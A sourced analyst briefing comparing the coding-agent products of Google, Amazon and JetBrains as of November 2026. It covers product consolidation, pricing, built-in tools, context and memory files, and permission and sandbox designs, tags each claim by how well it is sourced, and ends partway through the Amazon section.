---
url: https://developers.googleblog.com/an-important-update-transitioning-gemini-cli-to-antigravity-cli/, https://antigravity.google/, https://antigravity.google/blog/introducing-google-antigravity, https://antigravity.google/blog/introducing-google-antigravity-2, https://antigravity.google/blog/introducing-google-antigravity-cli, https://antigravity.google/blog/google-io-2026/, https://antigravity.google/blog/gemini-4-argon-in-google-antigravity, https://antigravity.google/docs/changelog/, https://antigravity.google/docs/sandbox?tab=cli, https://antigravity.google/docs/permissions?tab=cli, https://antigravity.google/docs/rules, https://antigravity.google/docs/subagents, https://antigravity.google/pricing, https://github.com/google-gemini/gemini-cli, https://github.com/google-gemini/gemini-cli/releases, https://github.com/google-gemini/gemini-cli/blob/main/package.json, https://geminicli.com/docs/changelogs/, https://github.com/google-gemini/gemini-cli/blob/main/packages/core/src/tools/tool-names.ts, https://github.com/google-gemini/gemini-cli/blob/main/packages/core/src/tools/definitions/base-declarations.ts, https://github.com/google-gemini/gemini-cli/blob/main/docs/tools/file-system.md, https://github.com/google-gemini/gemini-cli/blob/main/docs/cli/gemini-md.md, https://github.com/google-gemini/gemini-cli/blob/main/docs/cli/sandbox.md, https://github.com/google-gemini/gemini-cli/blob/main/docs/cli/plan-mode.md, https://github.com/google-gemini/gemini-cli/blob/main/docs/cli/auto-memory.md, https://github.com/google-gemini/gemini-cli/blob/main/docs/cli/acp-mode.md, https://jules.google/docs/changelog/, https://docs.cloud.google.com/gemini/docs/release-notes, https://developers.google.com/gemini-code-assist/docs/deprecations/code-assist-individuals, https://virtualizationreview.com/articles/2026/05/19/google-moves-gemini-cli-into-antigravity-cli-as-agent-platform-expands.aspx, https://www.testingcatalog.com/cloud-execution-is-coming-to-antigravity-soon/, https://aws.amazon.com/blogs/devops/amazon-q-developer-end-of-support-announcement/, https://github.com/aws/amazon-q-developer-cli, https://kiro.dev/blog/, https://kiro.dev/blog/introducing-kiro/, https://kiro.dev/blog/kiro-and-the-future-of-software-development/, https://kiro.dev/blog/one-year/, https://kiro.dev/blog/one-agent/, https://kiro.dev/blog/which-kiro-app-should-i-pick/, https://kiro.dev/blog/introducing-kiro-crew/, https://kiro.dev/blog/agentic-engineering-in-the-cloud/, https://kiro.dev/blog/cli-3/, https://kiro.dev/blog/local-sandboxing/, https://kiro.dev/blog/memory-in-ide-cli/, https://kiro.dev/blog/how-kiro-fixes-itself/, https://kiro.dev/blog/harness-properties-in-lean/, https://kiro.dev/blog/kiro-adopts-acp/, https://kiro.dev/docs/steering/, https://kiro.dev/docs/hooks/, https://kiro.dev/docs/specs/, https://kiro.dev/docs/models/, https://kiro.dev/docs/reference/built-in-tools/, https://kiro.dev/pricing/, https://github.com/kirodotdev/KiroCrew, https://github.com/kirodotdev/powers, https://blog.jetbrains.com/blog/2026/09/22/introducing-jetbrains-air/, https://blog.jetbrains.com/ai/2026/10/air-in-ides-eap/, https://blog.jetbrains.com/junie/2026/06/junie-coding-agent-out-of-beta/, https://blog.jetbrains.com/junie/2026/03/junie-cli-the-llm-agnostic-coding-agent-is-now-in-beta/, https://junie.jetbrains.com/blog/, https://junie.jetbrains.com/blog/junie-lite/, https://junie.jetbrains.com/blog/junie-local-launch/, https://junie.jetbrains.com/blog/ide-connected-ai-agents-understand-code-better/, https://junie.jetbrains.com/docs/HelpTOC.json, https://junie.jetbrains.com/docs/guidelines-and-memory.html, https://junie.jetbrains.com/docs/junie-cli-subagents.html, https://junie.jetbrains.com/docs/action-allowlist-junie-cli.html, https://junie.jetbrains.com/docs/byok-github-copilot.html, https://junie.jetbrains.com/docs/junie-cli-hooks.html, https://junie.jetbrains.com/docs/junie-cli-remote-mode.html, https://junie.jetbrains.com/docs/junie-headless.html, https://huggingface.co/JetBrains, https://www.devclass.com/ai-ml/2026/03/11/jetbrains-launches-ai-agent-ide-built-on-the-corpse-of-abandoned-fleet/5208890, https://www.infoworld.com/article/4149535/new-jetbrains-platform-manages-ai-coding-agents.html, https://zed.dev/blog/acp-registry, https://gihyo.jp/article/2026/01/acp-registry, https://thenewstack.io/kiro-agent-client-protocol
fetched: 2026-11-04
---

# Round 5: Google, Amazon and JetBrains coding harnesses (state at 2026-11-04)

**Tags.** [P] confirmed on the primary source (the vendor's or author's own page, repo or changelog, fetched 2026-11-04). [P\*] primary source, but the wording came back through a page summariser; check before it goes on a slide. Every quote marked [P] below was checked against the raw page text. [S] secondary source only (news or third-party blogs). [E] extracted from a source but not cross-checked. [R] refuted or wrong wording found circulating; recorded so nobody reuses it. [O] our own analysis, labelled as such. Dates are publication dates. Anything before about May 2026 is flagged as possibly stale.

## Short version

- **Google consolidated onto Antigravity in 2026.** Gemini CLI was cut off for free, Google AI Pro and Ultra users on June 18, 2026 and replaced by the closed-source, Go-based Antigravity CLI (`agy`). Jules goes read-only after Nov 11, 2026 and shuts down Dec 31, 2026. New Gemini Code Assist Standard/Enterprise subscriptions stopped selling on Oct 9, 2026. Every pointer now says "use Antigravity". [P]
- **Gemini CLI is not dead for enterprises.** The Apache 2.0 repo is still committed to daily (~~v0.69 nightly on Nov 4, 2026~~ [R] corrected: the releases published on Nov 4, 2026 are v0.67.0 stable, v0.67.0-nightly.20261104 and v0.68.0-preview.0; only `package.json` on `main` reads `0.69.0-nightly.20261104`) and is now positioned for Gemini Code Assist Standard/Enterprise and paid API keys. Its README says it is "Not tuned for the Gemini 4 series". [P]
- **Google says model, harness and product must be co-developed.** Antigravity 2.0 lists "Integrate the Antigravity product agent harness with the Gemini training and evaluation stacks" as a goal. Antigravity also now offers Claude Opus 5.5 and Sonnet 5.5 to Vertex AI customers (Oct 15, 2026). [P]
- **Amazon folded Q Developer into Kiro.** Q Developer CLI became Kiro CLI (closed source; the old Apache 2.0 repo says it "is no longer being actively maintained"). Q Developer IDE plugins and paid subscriptions reach end of support Apr 30, 2027. Q in the AWS console is unaffected. [P]
- **Kiro is the most "engineered" harness of the three.** One harness (the same binary, run as a local child process over stdio or in a cloud sandbox over a WebSocket transport, so one instance per client rather than one shared process) behind IDE, CLI, Web, iOS and third-party ACP editors; Cedar-backed capability permissions; Seatbelt/bubblewrap/AppContainer sandbox (off by default); Lean proved 70 of 96 candidate properties across models of 26 functions in the agent server, the CLI and Kiro Crew (Nov 2, 2026); and a self-improvement loop where "deterministic code" accepts or rejects model-proposed fixes. [P]
- **Kiro's philosophy is spec-driven development**: requirements (EARS notation), design and tasks files before code. Marc Brooker: "A specification is a kind of (version controlled, human-readable) super prompt." [P]
- **JetBrains bet on being the multi-vendor layer.** JetBrains Air (Sep 22, 2026) is an umbrella for Air in IDEs, Air Teams and Air Governance (formerly JetBrains Central). Air in IDEs "ships with no agents installed" and runs Codex, Copilot, Claude Agent, Gemini, Junie and any ACP agent. CEO Kirill Skrygan: "the future of agentic development will be multi-vendor." [P]
- **Junie is the JetBrains agent; GA June 17, 2026.** It drives the IDE's real debugger, uses the IDE's semantic index, supports any model (BYOK, local runtimes, and since Oct 30, 2026 a GitHub Copilot subscription as the model provider). Free Junie Lite runs Qwen 3.6 27B on JetBrains servers; Junie Local runs it on your own Mac or RTX box. [P]
- **ACP is now the common plug.** Gemini CLI (`--acp`), Kiro (its own harness protocol is ACP plus `_kiro/` extensions), Junie (rebuilt on ACP at GA) and JetBrains IDEs all speak it. JetBrains and Zed run the ACP Registry (beta since Jan 28, 2026). [P] / [S] for the registry launch.
- **[O] For a Copilot-only bank:** these three matter for ideas more than tools. Copilot already reads GEMINI.md and AGENTS.md (track1-agents-md.md); JetBrains Air and Junie can run on a Copilot subscription; Kiro's specs, steering and capability permissions are the clearest public designs to copy.

---

## 1. Google

### 1.1 What exists on 2026-11-04 (product map)

| Product | Status | Source | 
|---|---|---|
| **Gemini CLI** | Open source, Apache 2.0, ~108.7k stars. Since June 18, 2026 restricted to Gemini Code Assist Standard/Enterprise, Code Assist for GitHub via Google Cloud, and paid Gemini / Agent Platform API keys. Still released weekly (v0.65.0 Oct 20, v0.66.0 Oct 27, ~~v0.69.0 nightly Nov 4~~ [R] v0.67.0 stable and v0.68.0-preview.0 on Nov 4; `0.69.0-nightly.20261104` is only the `main` branch `package.json` version). | [P] github.com/google-gemini/gemini-cli README, releases and package.json (checked via GitHub API 2026-11-04); [P] geminicli.com/docs/changelogs |
| **Antigravity IDE** | Original agent-first IDE, launched Nov 18, 2025 (possibly stale details). Google plans to remove its Agent Manager "in an upcoming release, ... turning the IDE into a purely agent-powered IDE." IDE v2.6.0 (Oct 26, 2026) is the latest listed. | [P] antigravity.google/blog/introducing-google-antigravity-2; [P] changelog for the IDE version |
| **Antigravity 2.0 (App)** | Standalone desktop app, macOS/Linux/Windows, launched May 19, 2026 at I/O. "there is no IDE." v2.29.0 on Nov 3, 2026. | [P] same; [P] changelog |
| **Antigravity CLI (`agy`)** | Launched May 19, 2026; Go; same harness as the App; v1.4.12 on Oct 30, 2026. We found no public source repo under the `google` or `google-gemini` GitHub orgs. | [P] developers.googleblog.com; [P] changelog; [O] repo search; [S] "closed-source" per aq.dev and inventivehq |
| **Antigravity SDK** | Preview; "build custom agents using the Antigravity agent harness"; v0.1.23 listed. | [P] antigravity.google/blog/google-io-2026 |
| **Antigravity via Gemini API** | "The Antigravity agent through the Gemini API is now available for programmatic querying of the agent." | [P] I/O 2026 post |
| **Jules** | Async cloud agent. Turndown announced Oct 29, 2026: read-only after Nov 11, shut down Dec 31, 2026. | [P] jules.google/docs/changelog |
| **Gemini Code Assist (IDE extensions, agent mode)** | Consumer tiers stopped June 18, 2026. New Standard/Enterprise subscriptions stopped Oct 9, 2026; existing ones auto-renew through 2026, "auto-renewal will end in 2027". Agent mode still shipped updates in 2026 (Gemini 3.5 Flash GA in VS Code and IntelliJ agent mode, June 8, 2026). The Oct 9 note names Antigravity as the alternative "available through eligible Gemini Enterprise subscriptions and through Gemini Enterprise Agent Platform". | [P] docs.cloud.google.com/gemini/docs/release-notes |

**Pricing** [P\*] antigravity.google/pricing: Individual free ($0, "Basic weekly rate limits"); Google AI Pro and Ultra (more limits plus a "Flexible AI credit pool"); Business via Google Cloud from $30 per seat per month on Gemini Enterprise Standard/Plus, or pay-as-you-go with $0 seat fee and consumption pricing. I/O added a $100/month Ultra plan with "five times the capacity of the Google AI Pro plan" [P] I/O post.

**Adoption** [P]: the transition post cites "millions of users, with over 100,000 GitHub stars, 6,000 merged pull requests" for Gemini CLI. The Antigravity 2.0 post says "millions of developers have adopted the Antigravity IDE." Both are vendor-reported.

### 1.2 The consolidation, in Google's words

Gemini CLI to Antigravity CLI, Dmitry Lyalin (Group PM) and Taylor Mullen (Principal Engineer), May 19, 2026, https://developers.googleblog.com/an-important-update-transitioning-gemini-cli-to-antigravity-cli/ [P]:

> "Gemini CLI proved the terminal could be an incredible interface for agentic tasks, but your needs shifted. You now require multiple agents communicating with each other to split up the work and solve complex problems. This means your terminal tools need to share a unified backend with the rest of your workflow."

> "we can serve you best by pouring our energy into a single product built for today's multi-agent reality."

> "While there won't be 1:1 feature parity right out of the gate, we made sure Antigravity CLI keeps the most critical features of Gemini CLI: Agent Skills, Hooks, Subagents, and Extensions (now as Antigravity plugins)."

> "If your organization uses Gemini CLI or our IDE extensions via a Gemini Code Assist Standard or Enterprise license ... your access remains unchanged."

Jules turndown, Oct 29, 2026 [P] jules.google/docs/changelog: "as part of our work to unify our agentic coding efforts, Jules will wind down on December 31, 2026. You have until November 11, 2026 to continue finishing up sessions. After November 11, 2026, we will be turning Jules to read-only until the end of the year." The learnings "are shaping products across Google, including our agent-first platform, Google Antigravity." Users can export settings, env vars, scheduled tasks, memory and session history with Jules Tools; code stays on GitHub. [S] TestingCatalog reports cloud execution is not yet in Antigravity; [P] the Antigravity App changelog says "Remote agents are starting to roll out to Google AI Ultra and Pro subscribers" (v2.29.0, Nov 3, 2026).

Jules 2026 entries before the turndown [P]: Planning Critic for auto-approved plans (Jan 26), MCP support (Feb 2), auto-fixing CI failures (Feb 19), Gemini 3.1 Pro (Mar 9). These are the last Jules features; treat as history.

[R] Some coverage says Gemini CLI was retired for everyone on June 18. It was not: enterprise Code Assist licences and paid API keys keep it (primary post above).

### 1.3 Gemini CLI internals (open source, read from the repo on 2026-11-04)

**Agent loop.** Single main loop with subagents. `invoke_agent` tool; built-in `codebase_investigator` subagent (since v0.12, Oct 2025) and `cli_help`; a "generalist agent" (v0.26/v0.32); Plan Mode research subagents (v0.33) [P] changelog, tool-names.ts. Plan Mode is on by default since v0.34 (Mar 17, 2026); Shift+Tab cycles `Default -> Auto-Edit -> Plan`; the plan is a Markdown file the user can edit in an external editor before approving [P] docs/cli/plan-mode.md. A `complete_task` tool and an `update_topic` tool exist in the built-in list [P]. v0.63 (Oct 6, 2026) added "autonomous plan execution in non-interactive mode" [P\*].

**Built-in tools** [P] packages/core/src/tools/definitions/base-declarations.ts and tool-names.ts:

| Tool name | Purpose |
|---|---|
| `read_file`, `read_many_files`, `list_directory`, `glob` | Read and find files |
| `grep_search` | Text search (bundled ripgrep since v0.40, Apr 28, 2026) |
| `write_file`, `replace` | Write and edit |
| `run_shell_command` (+ background shell tools) | Shell |
| `google_web_search`, `web_fetch` | Web (search is Google Search grounding) |
| `write_todos`, `tracker_*` (6 task-tracker tools) | Planning and task tracking |
| `enter_plan_mode`, `exit_plan_mode`, `ask_user` | Plan Mode and clarification |
| `activate_skill`, `get_internal_docs` | Skills and self-help |
| `invoke_agent` | Subagents |
| `read_mcp_resource`, `list_mcp_resources` | MCP resources |
| `complete_task`, `update_topic` | Completion and session topic |

Plan Mode is restricted to a read-only subset (`PLAN_MODE_TOOLS`: glob, grep, read, ls, web search, ask_user, activate_skill, internal docs, codebase_investigator, cli_help, MCP resources) [P].

**Edit format.** `replace` is a search/replace tool with parameters `instruction` ("Semantic description of the change"), `old_string`, `new_string` and optional `allow_multiple`; by default it expects exactly one match [P] docs/tools/file-system.md. The `instruction` field is unusual among str_replace-style tools. v0.43 (May 22, 2026) "Steers models toward the `edit` tool"; v0.52 made `write_file`/`replace` skip "LLM correction" for JSON and IPYNB, so there is a model-based edit-repair step for other files [P\*] changelog.

**Code search.** grep/ripgrep and glob; no embeddings index or repo map in the built-in list [P]. IDE integration (VS Code, Zed, Positron, Sublime, Emacs) supplies open-file context [P\*] changelog.

**Context.** `GEMINI.md` hierarchy [P] docs/cli/gemini-md.md: global `~/.gemini/GEMINI.md`; workspace and parent directories; and "Just-in-time (JIT) context files" found when a tool touches a directory. Files support `@file.md` imports. `context.fileName` can be set to `["AGENTS.md", ...]`. `/memory show` prints the concatenated context. Context compression service (v0.38), "four-tier memory" (v0.40), adaptive token estimation (v0.43), 30-day chat retention default (v0.33) [P\*] changelog.

**Memory.** Experimental Auto Memory (off by default) mines idle past sessions (10+ user messages, idle 3+ hours) and drafts memory updates "as unified diff `.patch` files" and new `SKILL.md` files into a review inbox; it "never applies them without your approval" [P] docs/cli/auto-memory.md.

**Safety.** Approval modes Default, Auto-Edit, Plan, YOLO [P]. Policy engine replaced `--allowed-tools` (v0.30, Feb 25, 2026) [P\*]. Untrusted-folder default (v0.24); "fail-closed workspace trust that filters `mcpServers` in restricted mode" (v0.59) [P\*]. Sandboxing [P] docs/cli/sandbox.md: off unless `-s`/`GEMINI_SANDBOX`/settings; methods `docker`, `podman`, `sandbox-exec` (macOS Seatbelt profiles from `permissive-open` default to `strict-proxied`), `runsc` (gVisor) and `lxc`; changelog adds Linux bubblewrap/seccomp (v0.35), native Windows sandbox for subagents (v0.36) and Seatbelt deny-default (v0.53). The default Seatbelt profile allows network access.

**Extensibility.** MCP (incl. OAuth, resources), extensions, Agent Skills (default on since v0.26), custom commands, hooks (docs exist; no release entry), SDK (v0.30), headless JSON/stream-JSON output, A2A remote agents, ACP mode (`gemini --acp`, JSON-RPC over stdio; Gemini CLI is in the ACP Agent Registry) [P] docs/cli/acp-mode.md.

**Model coupling.** Gemini-only by design (OAuth, Gemini API key, or Vertex) plus local Gemma 4 via `gemini gemma` (v0.40-0.42) [P]. README: "Not tuned for the Gemini 4 series" and "Don't use Gemini CLI to benchmark Gemini models" [P].

### 1.4 Antigravity internals (closed source; from docs and changelog)

**Agent loop.** Main agent plus subagents. Built-in subagents [P] docs/subagents (quoted phrases checked against raw page text 2026-11-04): `research` ("Optimized for codebase research, file navigation, and structural exploration"), `browser` (sandboxed browser, only via `/browser`), and `self` ("A direct clone of the calling agent"). The main agent can define subagents on the fly with `define_subagent` and launch them with `invoke_subagent`, which "spawns a new concurrent session"; subagents can share the workspace, use an isolated Git worktree, or shared storage; nesting limit 10. Custom subagents are Markdown with YAML frontmatter in `.agents/agents/` or `~/.gemini/config/agents/` (fields: `name`, `description`, `tools`, `model` inherit/flash/pro, `commandExecutionPolicy`, `mcpServers`, `skills`).

Slash commands from the 2.0 post [P]: `/goal` ("Run until the specified task is completely finished, not asking for intermediate input from the user"), `/grill-me` ("Before starting to implement, ask questions back to align on the specific details of the plan"), `/schedule`. `/plan` with a configurable Plan Review Policy (App v2.17.0, Sep 22, 2026), `/compact` (v2.24.0), Automations (renamed from Scheduled Tasks, v2.21.1) [P\*] changelog. Tasks run asynchronously so they do "not block the main agent" [P].

**Verification.** The original Antigravity post puts verification into the output format: Artifacts are "tangible deliverables in formats that are easier for users to validate than raw tool calls, such as task lists, implementation plans, walkthroughs, screenshots, and browser recordings." [P] Nov 18, 2025 (possibly stale, but the principle carries into 2.0).

**Tools and edit format.** No full catalog published. Docs name `view_file`, `replace_file_content`, `grep_search`, `run_command`, `invoke_subagent`, `define_subagent` [P\*] docs/subagents. [O] `replace_file_content` suggests a replace-style edit tool; exact parameters not documented on the pages we read.

**Context.** [P] docs/rules (quotes and the 24,000-byte / 20,000-token figures checked against raw page text): workspace `AGENTS.md`, `GEMINI.md` or `.agents/rules/*.md` from the project folder up to the repo root; global `~/.gemini/AGENTS.md`, `~/.gemini/GEMINI.md`, `~/.gemini/config/rules/*.md`. "Rules are cumulative rather than replacement-based." Rule activation modes `always_on`, `model_decision` (only path and description injected until needed), `glob`, `manual`. Files over 24,000 bytes are truncated; global and always-on rules share a 20,000-token budget, and when it is exceeded "the largest rule files" become pointers. Antigravity does not load rules from subfolders below the workspace. `@path` references inside AGENTS.md work since App v2.11.0 (Aug 26, 2026). The 2025 launch post: "Antigravity treats learning as a core primitive, with agent actions both retrieving from and contributing to a knowledge base." [P] The 2026 docs we read did not describe the knowledge base. [S] third-party guides call these "Knowledge Items".

**Safety.** [P\*] docs/permissions and docs/sandbox:
- Every sensitive action is a permission resource `action(target)`: `read_file`, `write_file`, `read_url`, `execute_url`, `command`, `mcp`. Lists Deny, Ask, Allow; "Deny > Ask > Allow".
- App presets: Request Review (sandbox off, always ask), Default (sandbox on; commands in sandbox allowed; outside asks), Auto (sandbox on; "safe, reversible commands run without prompting, while risky or irreversible commands still pause for your approval"), Turbo (sandbox off, everything allowed).
- CLI: sandbox off by default (`"enableTerminalSandbox": false`); `agentMode: "auto"` turns it on. Auto "isn't currently available for business or enterprise accounts, including Antigravity in Gemini Enterprise" [P] docs/permissions (App tab). `--dangerously-skip-permissions` exists; since CLI v1.3.2 it "no longer auto-approves plans in `/plan` mode" [P\*] changelog. In Auto mode, subagent commands are "reviewed by a separate agent" (CLI v1.4.3, Oct 20, 2026) [P\*] changelog.
- Sandbox tech: Linux kernel namespaces; macOS `sandbox-exec` with Seatbelt profiles; Windows AppContainer (Windows 11 24H2 with August 2026 update). Project folder read-write, `~/.ssh` and `.env` blocked, no network by default; domains allowed under `read_url` join the outbound allowlist.
- Enterprise: admin policies for browser features, MCP allowlists and permission thresholds (App v2.5.0, Jul 31, 2026); Gemini Enterprise and Workforce Identity Federation sign-in [P\*] changelog.

**Extensibility.** Plugins and a Plugin Marketplace (CLI `/plugin` v1.3.2 Oct 8; partner plugins Figma, Linear, Notion, Stripe in App v2.28.2 Oct 29); `agy plugin import gemini` [S] migrates Gemini CLI extensions; hooks "in a simple JSON format" [P]; custom agents can declare hooks (v2.17.0); skills; MCP; SDK; Remote Control of local sessions from a browser (v2.9.1, Aug 20) [P\*].

**Model coupling.** Gemini first. Gemini 3.5 Flash default at I/O, Gemini 4 Argon added Oct 13-15, 2026. With Vertex AI and Application Default Credentials ~~the picker "can offer Claude Opus 5.5 and Claude Sonnet 5.5 when your project has access"~~ [R] wording corrected: "With Application Default Credentials sign-in, the picker also offers Claude Opus 5.5 and Claude Sonnet 5.5 when your project has access to them." (App v2.24.0, Oct 15, 2026; CLI v1.3.6, Oct 15, 2026) [P] changelog. Google states it co-develops the harness with the model [P] Antigravity 2.0 post:

> "The product, agent harness, and model layers all had to be co-optimized and co-developed, and while agentic coding is a necessary step towards general model intelligence, it is not sufficient."

> Goals: "Integrate the Antigravity product agent harness with the Gemini training and evaluation stacks" and "Rearchitect the product to be agent-first from the ground up, independent of an IDE or other dev-specific concepts such as repositories".

[P\*] The Gemini 4 Argon post (Oct 13, 2026) does not claim Argon was trained in the Antigravity harness; its numbers (35% more agentic code, 30% fewer rollbacks over four weeks) are internal Google anecdotes without method.

### 1.5 Google philosophy (from their own posts)

- **Agents own the surface.** "flips the paradigm of agents being embedded within surfaces to one where the surfaces are embedded into the agent." [P] Antigravity launch, Nov 18, 2025, https://antigravity.google/blog/introducing-google-antigravity
- **Reject both extremes of visibility.** "Most products today live in one of two extremes: either they show the user every single action and tool call the agent has made or they only show the final code change with no context on how the agent got there, and with no easy way to verify the work. Neither engenders user trust" [P] same post.
- **Reject remote-only agents without feedback.** "A core failing of a remote-only form factor is the inability to iterate easily with the agent. ... if there is no easy way to provide feedback, then it becomes more work than benefit to resolve the remaining 20%." [P] same post. [O] This is the stated design argument behind shutting Jules and building remote agents inside Antigravity.
- **Beyond coding.** "At some point, coding would expand to knowledge work" and "this agent-first paradigm has become standard across the industry." [P] Antigravity 2.0, May 19, 2026, https://antigravity.google/blog/introducing-google-antigravity-2
- **One harness everywhere.** Antigravity CLI and App "use the same Antigravity agent harness" [P] CLI post.

### 1.6 Google direction (shipped or stated, last 6 months)

Shipped: Antigravity 2.0, CLI, SDK, API access (May 19); Gemini CLI consumer cutoff (June 18); enterprise admin policies (Jul 31); Remote Control (Aug 20); new permission system (Sep 15); Windows sandbox (Sep 19); `/plan` (Sep 22); plugin marketplace (Sep 28 to Oct 29); Auto mode with sandbox review (CLI Oct 14); Gemini 4 Argon and Claude 5.5 via Vertex (Oct 13-15); Code Assist end of sale (Oct 9); Jules turndown (Oct 29); remote agents rolling out (Nov 3) [P]/[P\*].

Stated next: remove Agent Manager from the Antigravity IDE "in an upcoming release" [P]; ~~bring "learnings from Jules into Antigravity"~~ [R] not a verbatim quote; the Jules changelog says the learnings "are shaping products across Google, including our agent-first platform, Google Antigravity" [P]. No date for full remote/cloud parity [S].

---

## 2. Amazon (AWS)

### 2.1 What exists on 2026-11-04

| Product | Status | Source |
|---|---|---|
| **Kiro IDE** | Agentic IDE (VS Code-based [E]), preview Jul 14, 2025, GA Nov 2025 (possibly stale). | [P] kiro.dev/blog/introducing-kiro, kiro.dev/blog/one-year |
| **Kiro CLI** | Successor of Amazon Q Developer CLI. Closed source. CLI V3 (shared harness) default rollout Oct 9, 2026; Kiro CLI 3.0 launched Nov 3, 2026. | [P] github.com/aws/amazon-q-developer-cli README; [P] kiro.dev/blog/cli-3 |
| **Kiro Web** | Cloud sessions and Web GA Sep 3, 2026. Autonomous mode post Sep 14, 2026. | [P] kiro.dev/blog/agentic-engineering-in-the-cloud; [E] blog index title |
| **Kiro for iOS** | Preview, Jun 17, 2026. | [P] blog index, which-kiro-app-should-i-pick |
| **Kiro Crew** | Open source (Apache 2.0, ~4.8k stars), persistent multi-agent workspace, Aug 4, 2026. Grew from internal Amazon side project "MeshClaw"; ~~"over 39,000 internal builders"~~ [R] verbatim: "adopted internally by over 39,000 Amazon builders" in less than six months [P]. | [P] github.com/kirodotdev/KiroCrew (4,791 stars via GitHub API 2026-11-04); [P] kiro.dev/blog/introducing-kiro-crew |
| **Amazon Q Developer** | New accounts and subscriptions blocked May 15, 2026; IDE plugins and paid subscriptions end of support Apr 30, 2027. Q in the AWS Management Console "not impacted". | [P] aws.amazon.com/blogs/devops/amazon-q-developer-end-of-support-announcement (Ankit Sharma, Apr 30, 2026) |

The Q Developer CLI repo README [P] (Apache 2.0, last push Aug 24, 2026): "This open source project is no longer being actively maintained and will only receive critical security fixes. Amazon Q Developer CLI is now available as Kiro CLI, a closed-source product."

The AWS end-of-support post [P]: "The latest coding models, including Opus 4.7, are available exclusively on Kiro"; Opus 4.6 removed from Q Developer Pro on May 29, 2026. Q Developer in the AWS Management Console, AWS websites, Console Mobile App and Q Developer for Chat Apps "are not impacted by this sunset".

**Pricing** [P] kiro.dev/pricing (tiers, credits and pooling checked against raw page text): Free $0 (50 credits/month); Pro $20 (1,000); Pro+ $40 (2,000); Pro Max $100 (5,000; added Jun 11, 2026); Power $200 (10,000); add-on credits $0.04 each. Teams credit pooling $20/seat with 500 pooled credits per seat (Nov 4, 2026). GovCloud about 20% higher. Model multipliers relative to Auto (1.0x) [P] kiro.dev/docs/models (the listed figures checked): e.g. Claude Opus 5.5 2.0x, Sonnet 5.5 1.3x, Haiku 5.5 0.06x, GPT-5.6 Sol 4.4x, Fable 5.1 6x (Enterprise, US East), Qwen3 Coder Next 0.05x.

**Adoption** [P] Deepak Singh, Jul 14, 2026: "More than 100,000 developers tried Kiro IDE within the first 5 days ... By October, that number had more than doubled." ~~[P\*] same post: developers "roughly doubled every quarter"~~ [R] paraphrase, not the post's words; verbatim: "Kiro developers have been doubling over quarters" [P]. "a repository of 100+ curated powers" from partners [P]; 15,000+ community powers [P\*]. Vendor-reported.

Certifications [E] blog titles: ISO/IEC 27001:2022 (Sep 8, 2026); GovCloud (Feb 2026, [S] AWS weekly roundup).

### 2.2 Harness architecture: one process, many clients

"One agent, every surface: how we built the Kiro agent harness", Clare Liguori, Romain Dura, Al Harris, Richard Threlkeld, Aug 3, 2026, https://kiro.dev/blog/one-agent/ [P]:

- The harness is "a lightweight process that runs alongside your codebase ... and owns everything on the agent side. The client owns how the user interacts with the agent and how it presents the agent's work. The only way to cross that boundary is through the defined protocol interface."
- Why a process instead of a library: "A standalone process makes the separation real. The harness and clients don't need to share a language or runtime".
- Protocol: ACP over stdio locally (the harness runs as a child process of the editor or terminal), a custom WebSocket transport for Web and iOS, which connect to a harness in a cloud sandbox; Kiro-ACP extensions add "more than 20 agent-callable methods, 15 client-callable methods, and 20 notification types" under `_kiro/` [P].
- Clients can supply their own tools and suppress built-in ones; the IDE uses Code OSS APIs for file manipulation [P].
- Live steering: a message is injected at the next inference turn without cancelling the run [P\*].
- One compaction implementation for all clients ("Now there's one implementation, tested and improved in one place.") [P].

**Agent loop and modes.** Spec mode (`/spec new`), Plan mode, `/tangent` side threads, `/goal` (V3 behind Workflows opt-in), Workflows (multi-step, local or cloud, Sep 30, 2026), Agent Focus Mode for orchestrating several sessions in the IDE (Jun 25, 2026), `delegate` tool for background agents, `subagent` tool for parallel subagents with isolated context [P\*] cli-3, built-in-tools, which-kiro-app. Spec task execution: Kiro builds a dependency graph and runs independent tasks in concurrent "waves" [P\*] docs/specs.

**Tools** (CLI 2.x names; V3 catalog on a separate page) [P\*] kiro.dev/docs/reference/built-in-tools: `read`, `glob`, `grep` (both respect `.gitignore`), `write` ("Tool for creating and editing files"; the page does not give the edit operations), `shell`, `web_search`, `web_fetch`, `code` (symbol search, LSP integration, pattern search and rewrite), `introspect`, `delegate`, `subagent`, `todo`, `knowledge` (experimental semantic store), `thinking`, `session`, `goal`, `report`, `tool_search` (V2; V3 loads MCP tools through `tool_load` and `tool_call`). V3 dropped `use_aws`; AWS calls go through the shell tool and its approval rules, or an AWS MCP server [P\*] cli-3.

**Context.** Steering [P\*] kiro.dev/docs/steering: `.kiro/steering/` (workspace) and `~/.kiro/steering/` (global; workspace wins on conflict); team steering pushed by MDM or Group Policy. Default files `product.md`, `tech.md`, `structure.md`. Inclusion modes `always`, `fileMatch`, `manual`, `auto` (only CLI V3 supports all four). AGENTS.md read from global steering, workspace root and subdirectories, always included. Custom agents do not load steering unless listed in `resources`. Powers (repo description [P]): "Powers add specialized context and tools to the Kiro agents on-demand. No more MCP context overload."

**Memory** (Oct 20, 2026) [P\*] kiro.dev/blog/memory-in-ide-cli ("off by default for this launch" confirmed [P]): stores preferences, repo commands, corrections, debugging insights and ruled-out approaches; local to the machine, shared between IDE and CLI; global or per-repo scope; "off by default for this launch". [P] "Memory keeps specific context that can help with later work, rather than replaying past conversations." No pre-save approval step described; review is by visibility and deletion.

**Safety.**
- Permissions: "a single capability-based permission model backed by Cedar, a formally verified policy language" [P] one-agent. Capabilities `fs_read`, `fs_write`, `shell`, `web_fetch`, `mcp`, `subagent`; deny-always-wins across scopes; enterprise restrictions via MDM [P\*]. CLI V3 rules: deny > ask > allow [P\*] cli-3.
- Local sandbox (Oct 14, 2026) [P\*] kiro.dev/blog/local-sandboxing: macOS Seatbelt, Linux bubblewrap (+ socat), Windows AppContainer (one-time admin setup). Writes limited to project and temp; credential paths such as `~/.ssh` denied at kernel level; network through a local domain-filtering proxy. "Sandboxing is off by default today." [P] Configured in `sandbox.json` and `permissions.yaml`.
- Cloud sessions run in a managed sandbox, currently us-east-1 only [P\*] cli-3; IAM roles for sandbox access, Okta and Entra ID sign-in [P\*] cloud post.
- Kiro Crew: OS-level sandbox, denied-by-default commands, credential redaction, signed audit log [P\*].

